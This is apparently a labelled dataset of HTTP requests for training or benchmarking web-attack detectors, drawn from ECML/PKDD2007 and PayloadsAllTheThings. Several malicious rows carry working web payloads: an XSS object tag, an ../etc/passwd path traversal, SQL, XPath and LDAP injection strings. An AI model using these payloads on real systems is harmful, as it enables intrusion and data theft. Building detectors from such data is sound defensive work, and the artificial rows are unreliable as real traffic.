attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XSS,medium,4.5,malicious,"GET /Jinsertastyle3linputn/h.nEC.ksMUu5novEQgaB/iEs60joNa/9o4kd9eth/1whereqeZC8/tnr4ei/h8W.asmx?WqrcpxpR_Ndivc=8473409&eh8o=50255 HTTP/1.0
Host: 108.198.107.220
Connection: keep-alive
Accept: video/mpeg, image/jpeg;q=0.5, video/*;q=0.1
Accept-Charset: x-mac-cyrillic, x-mac-cyrillic, iso-8859-3
Accept-Encoding: <object  classid  =   ""   clsid:...  ""   codebase  =   ""javascript:    [alert   ('aeyel');]    ""  >
Accept-Language: sShdrbts-fgctve, weSad-y;q=0.1
Cache-Control: no-transform
Client-ip: 37.218.107.50
Cookie: aenntoanr=->nl[osg;oulaei9qjoerdl=e3oasrlye;rRbKNHF=srRxu0Oat6eqdbvaa;446CeRsx4Be=152610425
Date: Mon, 23 Aug 04 16:17:16 UTC
ETag: W/""x_dxmcYMKBlQmZ3""
Expect: nrfk
If-Modified-Since: Fri, 02 May 08 13:23:51 UTC
If-Match: ""-DTJ2.VSV0BzH_Q""
If-None-Match: *
If-Range: ""ewJu9VgBZU.Uxntv""
Max-Forwards: 1272
MIME-Version: 1.7
Referer: /m1etvulb.tiff
User-Agent: Mozilla/4.9 (Machintosh; U; PPC 8.2; 3c-mH; rv:2.9.2) Gecko/85487038
Via: 2.1 137.126.128.179, FTP/1.3 243.108.222.212, HTTP/4.7 4.75.212.179",46645,1042,xml_test-46645,ECML/PKDD2007,
Path Traversal,medium,4.0,malicious,"GET /4i4boot.ini7D5KincludeysIAstdin/l@yYxYI/oPotVTFh4B6kzpt/nF38.YnEOO/.Sz@access_logOOnYujpAO/sRhwOg5uE2t.N-RFrxp.cgi?AGcZ5CUservicest4=91674&4gshy=57&vlrrtdnu=tfn+accno%7Cevali-nsd&G6_OEUV=efoOF-r9GmM&RQdRrg6b=hSy1%2FH9Hthttp&GGsock_streamg9g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&8C70s5T1=reanm+rcws4urw&7ntirewonssette=tAo%3Fmixml7cn+a%27%5Btdim8o&harwbOW2=h HTTP/1.1
Host: www.rcney.fr
Connection: keep-alive
Accept: video/quicktime;q=0.7
Accept-Charset: *;q=0.3
Accept-Encoding: compress, identity;q=0.8, deflate, gzip;q=0.4
Accept-Language: *;q=0.1
Cache-Control: no-transform
Client-ip: 86.247.207.18
Cookie: Hsomh6btjsutS=f3B;tl5spfhalhenase=4window.openEa;nrzn=etalhrqlrmtm;as_pOYB6vincludeM=uk5PwE6NjrR;egegoenn=0ddoqrsf;X8lchildfounionJj=childnp
Cookie2: $Version=""86""
Date: Thu, 04 Jan 07 17:47:54 UTC
ETag: ""GFsg.faK@trgN@CsoV""
Expect: 100-continue
From: cewts@1fgr.fr
If-Modified-Since: Thu, 05 Oct 06 16:33:05 GMT
If-Unmodified-Since: Mon, 28 May 07 04:30:42 GMT
If-Match: ""CJUeT2Gb81.q09Uz.""
If-None-Match: ""5bMTjNrRklghvj6T@""
If-Range: ""wNk.zC30bLAvh.Qwl""
Max-Forwards: 46
MIME-Version: 0.4
Pragma: Se='sm'
Proxy-Authorization: NTLM YWFHbUVzVWVJY2E0dmY0bHNybWVkbnJuUmJlMHNhamlobG8zdXM=
Authorization: Digest nc=c9fbAb9B
Range: 2-1818,846125-
Referer: /4Coc/x3soAa.exe
TE: deflate
Trailer: Accept-Encoding
User-Agent: 2dznav (dV23ANK93q; znp0FaWuBW; lFVBv8fS; eEbj@n8u9o)
UA-CPU: StrongARM
UA-Disp: 4968,8587,8
UA-OS: Windows 95
UA-Color: color32
UA-Pixels: 3216x516
Via: o3r/9.7 148.141.3.138, nee/0.6 www.eaakn.jpeg
Transfer-Encoding: deflate
Upgrade: EutP9q/0.0, tvoa/2.5, adr7m/4.2, mmn/1.2, egg2x/1.5
Warning: 191 www.ts61.gif ""suticae"" 
X-Forwarded-For: 241.79.66.180
----: ---------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",46380,1847,xml_test-46380,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /login HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Connection: close

username=substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)&id=1316",,252,patt-xpath-injection-0316,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"
,hard,-2.0,benign,"GET /hMVy6wbnN4OYD/nl48N4bROf6Q/99dj91OU5/4ncOz0w/c4obenus0.html?epie9trvcmwn75=o0-tzjECB&ondsex=14844094&_H-CNEl27=62343&oedeaae=78636150&ieoooeevrtd=rex6eVcatsock_streamq9accepty+&e0llsmxi=a4keu59&rhsa1hbapoyuwje=35972785&Wahbirog8sE4=5157515&791sT=rFfni40&u2WVKQ.r=cAwbf_w HTTP/1.1
Host: 112.225.243.235
Connection: close
Accept: application/zip;q=0.0
Accept-Charset: x-mac-ce, iso-8859-8-i;q=0.5, euc-tw, ks_c_5601-1987;q=0.7
Accept-Encoding: compress;q=0.4, gzip, deflate;q=0.5
Accept-Language: *;q=0.8
Cache-Control: only-if-cached
Client-ip: 77.98.59.51
Cookie: rxtMTag9ls=14681960;iOyia4a7A5n='hEses4af\e;pn5sgnpc8ia=05t7y8];PIimuizeshcknli=uhtsnfeahulseu;uorrAhafv27thn=m<i$g;sedeOjd=6
Cookie2: $Version=""163""
Date: Wed, 31 Mar 04 13:27:45 UTC
ETag: ""t1csvA7u4nvzVMov1wM""
Expect: 100-continue
From: oi0i@it43.it
If-Modified-Since: Mon, 11 Feb 08 11:13:31 GMT
If-Unmodified-Since: Tue, 10 Jan 06 23:50:46 CET
If-Match: ""zQB7qM3a4xWEPGRz-H""
If-None-Match: *
If-Range: Sun, 06 May 07 03:19:38 CET
Max-Forwards: 0700
MIME-Version: 6.0
Pragma: t=gNp1ee
Proxy-Authorization: Basic YTlpNjpsb3JF
Authorization: Digest uri=/l7Tnqroh.nsf
Range: 7-27394,731-8,0552-
Referer: http://www.z1ziuun.cz/etXot/y7et7u/snnrs2.jpeg
TE: gzip
Trailer: Referer
User-Agent: Mozilla/8.5 (Windows; U; WinNT 7.9; mr-io; rv:9.0.3) Gecko/36176380
UA-CPU: 68000
UA-Disp: 568,509,16
UA-OS: Solaris
UA-Color: color32
UA-Pixels: 040x521
Via: 3.3 www.kilene.shtml
Transfer-Encoding: eazay; l8leac=hta3lett
Upgrade: ews/8.3
Warning: 480 www.6ge64dis.htm ""TNisirlesy0eema"" 
X-Forwarded-For: 86.182.5.47
X-Serial-Number: 2418413
----: ------------------
~~~~~: ~~~~~~~~~~",21336,1684,xml_test-21336,ECML/PKDD2007,
,hard,-2.0,benign,"GET /e5Bt75_NAuoV@WPE73w/h94b5/tO9b8QFpmd/qehhAr/2QD-XAD1/eIRVxA/oG.R6ax4k5h3Srq/hbbl340c.dll?8NRe3JT3qD=dwMBbS&htaccesbetweene-Kndeletevj=51423&rell4mIt=g7hNzEeiopmZEsr&eservicesOb2BvS1x=F8ree&qEcq=5taahy2u9Ehbeha&i3annoesEbcax=21496&HBW2WbKw4locationKJ=677&ityielisdamRmoN=n1iwtPcnecb6&Ngnaedl=passthruy HTTP/1.1
Host: www.nlqnuccTos.be:30
Connection: close
Accept: video/*;q=0.0, video/*;q=0.2
Accept-Charset: macintosh, iso-8859-8
Accept-Encoding: gzip;q=0.4, compress;q=0.3
Accept-Language: *;q=0.4
Cache-Control: no-cache
Client-ip: 34.199.208.241
Cookie: eARag5rsgmn=lrrebiOvdehrilu4an;onde3Ne=79551764;6thasytn=evallog0;zilnrTrr=Re;nxk5en29est=fealdtecoatPprhu;hsyeun1=947771793
Cookie2: $Version=""38""
Date: Thu, 03 Jun 04 10:08:52 CET
ETag: W/""QD7G_upMUzYLHZ4""
Expect: 100-continue
From: iaamdisn@peasep.org
If-Modified-Since: Sat, 06 Jun 09 08:57:07 CET
If-Unmodified-Since: Sun, 05 Aug 07 09:54:06 CET
If-Match: ""0S7jyLSWsp-YnNuzcb""
If-None-Match: ""shL30E.z48i471pTe""
If-Range: *
Max-Forwards: 8
MIME-Version: 5.1
Pragma: onFuh=zdnno6oa
Proxy-Authorization: NTLM dHJkanQ2cmNlYXdPZXJtbnppZWV1dHRvb0dlZnVvYm9pZmhwYU52aXVzOG53VXJh
Authorization: Digest response=""3cF4A7Efa9Cf8C844FFEffd30CBbD47A""
Range: 8-,2512-,696-3957
Referer: /1ePaaeA3/JGaptc/loao6u/ttxyne/rcsmc.php3
TE: chunked
Trailer: TE
User-Agent: Mozilla/3.5 (compatible; ugker; SunOS sun4u; inaelmdej; alxas; 5anIetbo)
UA-CPU: x86
UA-Disp: 2596,238,32
UA-OS: Win9x
UA-Color: color32
UA-Pixels: 562x0900
Via: 2.5 www.ni0l.html:0, 1.1 www.ev16.html
Transfer-Encoding: D3eprL; SWturi=ayur
Upgrade: lil/6.2
Warning: 013 www.desun.jpg ""AikotD"" ""Sun, 12 Nov 06 05:18:44 UTC""
X-Forwarded-For: 122.12.60.197
X-Serial-Number: 56784
----: ---------------------------------
~~~~~: ~~~~~~~~~~",31357,1793,xml_test-31357,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close

redirect=count(/child::node())&id=1456",,198,patt-xpath-injection-0456,PayloadsAllTheThings,count(/child::node())
SQLi,medium,3.0,malicious,"GET /bITinsertYOqHdall0wL.g/craee5wledfzhiwo/iacyntaocTrodui/pbtkNa/dc0yxZm/rj9hpdwrfgez/DdTUOVo/tq.html?9shrkreytsrma=%27select+++++customer_phone+++%27%7C%7C%27from++customers+%27%7C%7C%27where++++customer_surname%3D%27%27%27%7C%7C++++lv_surname%7C%7C%27%27%27++and++++customer_type%3D1%27%3B&oestnrsjmev=63s0a HTTP/1.0
Host: 32.239.56.140
Connection: imvSoaI
Accept: image/jpeg;q=0.2, text/plain, application/postscript
Accept-Charset: x-mac-cyrillic;q=0.6, iso-8859-7;q=0.0
Accept-Encoding: *;q=0.5
Accept-Language: *
Cache-Control: ft4a='owsPaS'
Client-ip: 203.18.145.66
Cookie: rsyoasinsmnaa4=b
Cookie2: $Version=""01""
Date: Sun, 05 Jul 09 08:53:23 GMT
ETag: W/""yKcgygKPCwRoQ3lbkIJ""
Expect: ul4i0tva
From: uims2c@rtXh1sbi2a.cz
If-Modified-Since: Tue, 31 May 05 05:38:45 GMT
If-Unmodified-Since: Fri, 23 Sep 05 05:05:41 UTC
If-Match: ""RZeWUmEl@SmE-rH-sp""
If-None-Match: *
If-Range: Mon, 01 Nov 04 08:58:29 CET
Max-Forwards: 4366
MIME-Version: 0.4
Pragma: Ec1=n
Proxy-Authorization: NTLM aG91bjd0ZWhzYWRkcmh3ZW95YzA2YWNocnJldHFhbHNub3VhYXdlZGl0M2xyOTE=
Authorization: Basic b2VlZ3c6bmFuSGF6
Range: 2764-93323,17883-91
Referer: /Zrd0q.swf
TE: trailers,trailers,trailers
Trailer: Date
User-Agent: 3B4t3J1 http://www.tofpof.net
UA-CPU: StrongARM
UA-Disp: 9347,2639,16
UA-OS: Windows 95
UA-Color: color16
UA-Pixels: 044x365
Via: 6.0 76.219.28.188, utq/8.6 www.ehjoke4.png:7375
Transfer-Encoding: deflate
Upgrade: 4sh/4.2, Rdhtih/8.1
Warning: 984 www.itta9e.css:2 ""tnFBt1atci4lailr0ph"" 
X-Forwarded-For: 123.208.82.116
X-Serial-Number: 3139045
----: --------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41879,1659,xml_test-41879,ECML/PKDD2007,
LDAP Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close

q=)(cn=))\x00&id=1111",,174,patt-ldap-injection-0111,PayloadsAllTheThings,)(cn=))\x00
,hard,-2.0,benign,"GET /htn5omtnsnD/gxmf/ie6-Dd./o4x-.uW4wnr18/nsP8NgYm_9H-tt/MrNa0akh2-X.INorc.bin?rl=t%2Fhobject%27%7EM+&5WWJ9tmpEUhtpass=wtHtr5aihn&ed=bw1d&axfieotnngai92=4yrokbnrEan&smeainfee=nDzmoA8p&Agekot5sa9si3n=sseil0orfkR HTTP/1.1
Host: 180.199.225.153
Connection: ielfshTl
Accept: */*;q=0.7
Accept-Charset: cp-936, isiri-3342;q=0.5, windows-1255;q=0.1, x-mac-hebrew, x-mac-hebrew;q=0.2
Accept-Encoding: *
Accept-Language: *;q=0.1
Cache-Control: grtEjani='neOrwgd'
Client-ip: 246.18.133.160
Cookie: lgehanoSjba=hPEheir?s?Idb5%fu;flmiotwNs=b4euh;4iam9ec=728;bdueisi34i=49497892;egUmtoorft=ehooaint7n2bdndeiE;4rJbrmf0fugz=&o
Cookie2: $Version=""9""
Date: Tue, 21 Mar 06 03:42:59 UTC
ETag: ""S44DbdJ0AYu-9WZWFH""
Expect: 100-continue
From: idehs@lb6ztam.biz
If-Modified-Since: Mon, 16 Oct 06 08:36:53 UTC
If-Unmodified-Since: Fri, 14 Dec 07 05:09:23 UTC
If-Match: *
If-None-Match: ""a_@OJqy9iuQ1gza0NTum""
If-Range: *
Max-Forwards: 4
MIME-Version: 3.7
Pragma: o6=y
Proxy-Authorization: NTLM YWVnaXR1bmVodWFvZWFVTUVpbHJocmw4ZWNzbHMyZHRkbnNyZnhz
Authorization: NTLM aGx1b2Fqd1VpZWVzeXU3aDZyb3JnaHJ1ZXMzZWF1bnB0c3RodEloMXUyNmFudGxh
Range: 8656-,477-859015,5910-
Referer: /esssdy1C/nmnsola/aerytgy/ciSd/uiplhe63.gif
TE: gzip,chunked,trailers
Trailer: Range
User-Agent: Mozilla/0.0 (Windows; U; Windows NT 3.6; sa-3S; rv:0.6.0) Gecko/64038285
UA-CPU: 68000
UA-Disp: 176,3441,32
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 775x0014
Via: 2.4 120.132.88.85, 5.9 www.s1Oexnf.jpg
Transfer-Encoding: compress
Upgrade: se7/3.4, xaa/8.7, srlhe/8.3
Warning: 178 126.189.30.55 ""LptaNsntoaeessie6"" ""Sun, 23 Jul 06 12:48:27 CET""
X-Forwarded-For: 147.32.251.83
X-Serial-Number: 740529934868246
----: ------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",24090,1773,xml_test-24090,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /cZbGGqsUA5HTWj.jpeg?hnEcTgmytYt5s=5Z9mXHKi&Ncvx5gab=%27+++group++by+++++users.id++++having++++2%3D2&2eTOAyik=it4yc%3Ci7E8&erEirid=nojeRpnm%29wp%2Bbee&pGJtmp=71445718&Lsrssxniteatn=41&xtp5bhPeti=63&welnnhoiAeia=5823 HTTP/1.0
Host: 167.45.153.2
Connection: close
Accept: */*
Accept-Charset: *
Accept-Encoding: compress, gzip, deflate;q=0.1
Accept-Language: fghk-kntaw;q=0.4
Cache-Control: max-stale=62965
Cookie: eleenitbg=ue
Date: Sat, 06 Nov 04 08:10:28 UTC
ETag: ""xs@3tPvr8T.jKwZ7M6C""
Expect: edzd=keea
If-Modified-Since: Sun, 01 Jul 07 24:24:51 CET
If-Unmodified-Since: Wed, 14 Jan 09 04:44:55 CET
If-Match: ""PYwkduxR3xQ6IRotd-C""
If-None-Match: ""6414UPycTaOr9QTdR""
If-Range: ""r@1bfIIiOX1_k1qKLf""
Max-Forwards: 01
MIME-Version: 3.1
Pragma: no-cache
Proxy-Authorization: Basic c2lqb3c6c3lmd2hlSm8=
Authorization: NTLM cm9xZGVyb3JydW9mU2l4NElzeHJMaWVsaWwzYmF0Z2E2
Referer: /hih1.conf
Trailer: TE
User-Agent: Mozilla/5.7 (compatible; nghot; Win 9x; cpm72pO3; ttayhFhnoO; 9llnigi56n)
UA-OS: Linux
UA-Pixels: 4111x1385
Via: 2.3 www.peta.shtml
Transfer-Encoding: ve4tr
Upgrade: a1uoii/9.3, 2Nnr06/6.4
Warning: 213 www.ha181.png ""anao"" ""Fri, 28 Dec 07 24:10:22 UTC""
X-Forwarded-For: 115.143.230.10
X-Serial-Number: 323144017545
----: --------------------------------------------------",35424,1316,xml_test-35424,ECML/PKDD2007,
,hard,-2.0,benign,"GET /uisof3rKqg_iSOeBnd/tRuH@I/eeshmqDhx9eo/mRMvP/33jVZB2-58wp-Pg_W/u920U3RlhUit/6ncnDayn0Rgyoctqh/taemhi9e/nsmoNHaqQlh@g/hh4UZYvE2aeOFoWwv/is.swf?cuuhocilnlbt=0625&EHE=6137803074&eoeertr=byusppeed1eaftdsE&ei=1&Tn2seve=ean5saas&tts04zsjaafj=a%7C%3Clogwo2awwcvariseval4&reogao=t&aebrisuyai=e3t0kys6&wjranYWJkimg=ehIahejn&lhpiihes3sek=-&bseeE=26&i0t=807&hBstSwBfnio=501&H7eiJr=eRn6czoo HTTP/1.1
Host: www.fmtceEAdwn.net
Connection: close
Accept: */*;q=0.7
Accept-Charset: windows-1257;q=0.8, iso-8859-5, iso-8859-5
Accept-Encoding: 
Accept-Language: de-on5k, wmlmnn-9jtdos5t, Rhs2Ief-Cho;q=0.7
Cache-Control: max-age=18316
Client-ip: 54.135.83.53
Cookie: gon3wa2=t
Cookie2: $Version=""833""
Date: Tue, 07 Oct 08 08:11:32 CET
ETag: ""XeYNVJeAf30CKdgTK4d""
Expect: ay2unwu=ibieoeya;itaeqmon=wcAn
From: tetoseli@i9ihet.it
If-Modified-Since: Sun, 12 Sep 04 19:31:18 UTC
If-Unmodified-Since: Thu, 09 Sep 04 06:27:19 GMT
If-Match: ""d1@z.eUxY2oQQnWs""
If-None-Match: *
If-Range: *
Max-Forwards: 101
MIME-Version: 1.3
Pragma: n1=llmAB
Proxy-Authorization: Basic cnJpMGFlbjptaDlpcw==
Authorization: Digest uri=/oestahjk/earNhalt/edodesO/e40rnh/bo4eejnp.cgi
Range: 97-403959,415744-,056-023107
Referer: /4eot/iea2Sd/Sgao/nnlsddog/jayise8.jsp
TE: gzip;q=0.7,trailers
Trailer: User-Agent
User-Agent: htTewsae/0.3
UA-CPU: Sparc
UA-Disp: 699,5720,32
UA-OS: Solaris
UA-Color: color32
UA-Pixels: 8535x3103
Via: wils/3.9 www.es5aeaex.js, HTTP/7.8 www.ttuw.htm:15680, 4.7 www.To0arc.jpg
Transfer-Encoding: gzip
Upgrade: tae/6.4
Warning: 050 42.224.216.74 ""terFienh"" ""Wed, 12 Mar 08 09:39:17 GMT""
X-Forwarded-For: 227.174.126.186
X-Serial-Number: 0491740909145878411
----: ---------------------------------------
~~~~~: ~~~~~~~~~~~~~",22532,1749,xml_test-22532,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /sock_stream1awzUB.IU1/ohomehregrEnab7ew9se/7.Qb9oG/9U283VjV_ZmyF0/uu5iUa.uslYsv-4-e5L/UNYgformLrYLZli/l9tfecebxdtGbeagn/r6JnWlkDP5F7Z/l0ntl/e6AU3rmp4gf2.js?nmacs=hcg&zhoh0llseaT=ufh&tnsneoenlArde=d%25h3&3HfOJqAjITH=aEuusTKO8e6&aEanehepnt=%27+++OR+++++%27app%27+++++%3E++++%27S&Zev=82&Svgl4ef=i6afynrpewrttf&as4eaDherap=0gtra&er=whi2-k HTTP/1.0
Host: 169.105.21.124:72615
Connection: saas0ril
Accept: image/png;q=0.8
Accept-Charset: *;q=0.5
Accept-Encoding: 
Accept-Language: ryutg-hsee, fsnsBsqs-mca
Cache-Control: only-if-cached
Client-ip: 149.160.7.148
Cookie: Srdeioh=s%
Cookie2: $Version=""73""
Date: Sun, 18 May 08 22:39:14 CET
ETag: W/""NBtBFUHwyb@U6oz""
Expect: er37ac=rtaefe;celo
From: ieogO97c@1xtO.uk
If-Modified-Since: Wed, 07 Sep 05 04:20:40 UTC
If-Unmodified-Since: Thu, 02 Feb 06 10:15:43 GMT
If-Match: *
If-None-Match: ""b5Iin6Q.3RF3p.tS1""
If-Range: *
Max-Forwards: 403
MIME-Version: 3.3
Pragma: pHeo=soisHll
Proxy-Authorization: 8eEcs dejCatel=tunerro
Authorization: Digest opaque=""8ohdh""
Range: 716-,83323-
Referer: /iisr/Otrno4ke/ucGmnn0/mkthltk/Edtee.pdf
TE: chunked
Trailer: Referer
User-Agent: Ohne6aar0 (nHUiWBov; e7f_jlRK; 4fgznG4NO)
UA-CPU: StrongARM
UA-Disp: 420,4746,32
UA-OS: Linux
UA-Color: color8
UA-Pixels: 7179x0700
Via: wage9l/2.5 3.65.189.140, HTTP/8.9 www.iiaehtia.js, HTTP/0.7 180.7.214.179
Transfer-Encoding: compress
Upgrade: I8j/1.5, gc9ecr/7.1
Warning: 900 139.60.79.76 ""ln9aeaneieNgnh6Hl"" ""Mon, 29 Jan 07 22:28:50 GMT""
X-Forwarded-For: 149.48.124.188
X-Serial-Number: 3908709
----: --------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",35261,1630,xml_test-35261,ECML/PKDD2007,
,hard,-2.0,benign,"GET /vybIpgootoefhhro/iBJGUOMJVIX-/tV5q1/i.e/rceet7a/iB-RY5U5Dc.php? HTTP/1.0
Host: www.63ehm.ch
Connection: keep-alive
Accept: text/xml;q=0.1, audio/*
Accept-Charset: windows-1252;q=0.0, shift_jis;q=0.7
Accept-Encoding: 
Accept-Language: a4f-an, aXrvea-hanlxls5
Cache-Control: only-if-cached
Client-ip: 8.140.139.237
Cookie: wqKzFFl=huton;devefyvlomtsYLt=eninipioeaAsteno
Cookie2: $Version=""9""
Date: Sun, 25 Jan 04 02:20:10 CET
ETag: W/""PMH3mRdbr9zn8H8bvP""
Expect: hAesog
From: hrhe@thdtgL.uk
If-Modified-Since: Thu, 15 Nov 07 15:43:01 GMT
If-Unmodified-Since: Sun, 07 Mar 04 09:36:56 UTC
If-Match: *
If-None-Match: ""WkutdW@uw0Dtr7zHz0K""
If-Range: Mon, 10 Aug 09 08:33:10 UTC
Max-Forwards: 8262
MIME-Version: 9.6
Pragma: u='euY'
Proxy-Authorization: naoa orne=tnlmssv
Authorization: Digest username=""s4hv4""
Range: 73394-4909,050042-,203-3
Referer: /ea1zrine/eEoR/cite.mdb
TE: gzip
Trailer: Accept-Language
User-Agent: Mozilla/1.6 (Windows; U; Windows NT 3.4; ao-ea; rv:4.6.6) Gecko/75519951
UA-CPU: 68000
UA-Disp: 6270,1333,8
UA-OS: Linux
UA-Color: color32
UA-Pixels: 5233x580
Via: 8.4 109.148.132.211, 7.9 www.o5tt.html
Transfer-Encoding: compress
Upgrade: rez4na/9.8
Warning: 014 123.249.187.19 ""ccuiedee"" 
X-Forwarded-For: 153.189.235.245
X-Serial-Number: 3680166238
----: ------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",21675,1387,xml_test-21675,ECML/PKDD2007,
,hard,-2.0,benign,"GET /u8Q8s2ae2ribp/tBShVo-tX1/Re/gVty9YWbcMT/QCxSjsv-s/p9-Awp/6PWpdKt71J/iL2LUIxELxziVi/cetie/rdyA2gZZK@S56Lapd1.cgi?QI.5k5eJ5=%2F8&Bsnyi=+rsv&GTDji3dtg4-=xed.nZB&tmcsdimznz=ig2Kb&diecNittreetMni=4004&unRWY5RopenrPprocessing-instructionI=TtAeYalni6utNtor&kinfYnnodfuN5zV=9auohhtcn&qawbodygq=ers0d9ee7Sc&tb=aRzz&trenyB=90563&IRen8meiA=o%29&es1o=axlbtinaRhoak3A HTTP/1.0
Host: www.oot2e.com
Connection: close
Accept: application/x-tar, application/*, text/xml
Accept-Charset: iso-8859-15;q=0.9, us-ascii;q=0.0, cp-936;q=0.4, iso-8859-8-i;q=0.0, iso-8859-9;q=0.7
Accept-Encoding: 
Accept-Language: s-kloe6yte;q=0.3, kwoe2-e;q=0.8, csaeE-tqtv;q=0.4
Cache-Control: no-store
Client-ip: 10.4.122.248
Cookie: sgolc=5752;gusaetedaEphorx=2cetweaiax2c3leru
Cookie2: $Version=""626""
Date: Mon, 25 Jun 07 23:48:11 GMT
ETag: W/""RqOfUIrMkFeqervFbqid""
Expect: re5ottt
From: yHte1@lubebreIb.biz
If-Modified-Since: Wed, 24 Dec 08 06:15:12 GMT
If-Unmodified-Since: Thu, 29 Apr 04 20:28:11 UTC
If-Match: ""pdYvsyT3WsWEj3JxJ""
If-None-Match: *
If-Range: *
Max-Forwards: 13
MIME-Version: 5.8
Pragma: te=qhaiE
Proxy-Authorization: Basic b291ZGFvOjRFcmgzdGU=
Authorization: dnjdkN ftenhj=ev97i
Range: 285-321592,-0,1-98
Referer: http://eieirhu.de/iahsse/8a4b/nlnnxhie/ictdor/e4jawt.swf
TE: trailers,chunked
Trailer: Accept-Language
User-Agent: Mozilla/2.8 (compatible; Konqueror/7.2; SunOS sun4u; zstrYi0oc)
UA-CPU: MIPS
UA-Disp: 754,026,32
UA-OS: FreeBSD
UA-Color: color32
UA-Pixels: 047x6463
Via: HTTP/7.3 175.64.100.0
Transfer-Encoding: compress
Upgrade: h7ie/3.3, LnC/5.0, hAteV/9.3, nrgX/0.9, 4yoeea/8.1
Warning: 502 www.deutlFai.htm ""sdoAadanidclexcd"" ""Sun, 24 Jan 10 15:55:45 CET""
X-Forwarded-For: 36.67.190.24
X-Serial-Number: 399935744
----: --------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",3568,1862,xml_test-3568,ECML/PKDD2007,
,hard,-2.0,benign,"GET /tF@CSaw4bn0/tT6tNabt5Ifs/otv/lMga3_Tr@lQu/qENUN/d2re3carbt7EAEcNe1/hvV7VmBTq/e7tsc.html? HTTP/1.0
Host: 245.234.164.201:80
Connection: close
Accept: */*
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *;q=0.1
Cache-Control: only-if-cached
Client-ip: 245.152.29.140
Cookie: huRwSkNMO=05838424
Cookie2: $Version=""3""
Date: Fri, 22 Sep 06 07:06:32 UTC
ETag: W/""Tv4.Qtf.FEuzc7xI""
Expect: erxiatn
From: LwAn@l8wp.de
If-Modified-Since: Wed, 04 Jul 07 09:54:56 GMT
If-Unmodified-Since: Sat, 07 Aug 04 09:24:48 UTC
If-Match: ""U7cCOsCvrbqw_OJIR3qR""
If-None-Match: *
If-Range: Tue, 18 Oct 05 11:00:05 GMT
Max-Forwards: 1254
MIME-Version: 7.2
Pragma: no-cache
Proxy-Authorization: Digest uri=/owa7YtW/e1ota/dtnFostn/b9tyu/EIRi.pl
Authorization: Digest realm
Range: 99683-
Referer: http://stlel.net/keirrIhi/rSaqdes/Dwa5Eitq/Btmd5/sk5eMnp.php
TE: trailers,trailers
Trailer: If-Modified-Since
User-Agent: nueq/1.7
UA-CPU: MIPS
UA-Disp: 233,8266,16
UA-OS: Win98
UA-Color: color8
UA-Pixels: 1988x830
Via: 1.9 181.177.42.122
Transfer-Encoding: compress
Upgrade: vsrd/9.2
Warning: 352 www.b5to7r.jpeg ""v2agiy"" 
X-Forwarded-For: 156.12.70.0
X-Serial-Number: 47214022934711888870
----: ------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",13533,1287,xml_test-13533,ECML/PKDD2007,
